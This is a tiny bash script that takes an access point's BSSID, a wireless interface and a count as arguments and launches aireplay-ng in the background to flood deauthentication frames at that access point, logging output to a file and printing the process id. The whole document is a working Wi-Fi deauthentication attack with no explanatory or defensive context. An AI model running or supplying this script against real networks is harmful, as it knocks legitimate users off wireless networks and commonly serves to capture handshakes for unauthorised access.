#!/bin/bash
eid=$1
bid=$2
chan=$3
iface=$4
freq=$5

#aireplay-ng $iface --deauth $freq -a $bid> /dev/null 2>&1 & pgrep aireplay-ng
aireplay-ng $iface --deauth $freq -a $bid> deauth.log 2>&1 & pgrep aireplay-ng

